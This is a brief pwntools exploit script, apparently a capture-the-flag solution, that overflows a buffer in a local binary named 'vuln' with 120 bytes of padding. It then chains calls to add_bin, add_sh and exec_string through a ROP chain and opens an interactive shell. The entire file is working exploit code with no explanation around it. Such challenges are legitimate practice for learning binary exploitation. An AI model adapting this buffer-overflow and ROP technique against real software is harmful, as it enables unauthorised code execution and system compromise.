from pwn import *
#p = gdb.debug('./vuln', 'b main')
context(os='linux',arch='amd64')
p = process('./vuln')
junk = b'A'*120
e = ELF('./vuln')
r = ROP(e)
r.call('add_bin', [0xdeadbeef])
r.call('add_sh', [0xcafebabe, 0x0badf00d])
r.call('exec_string')
print(r.dump())
p.sendline(junk + r.chain())
p.interactive()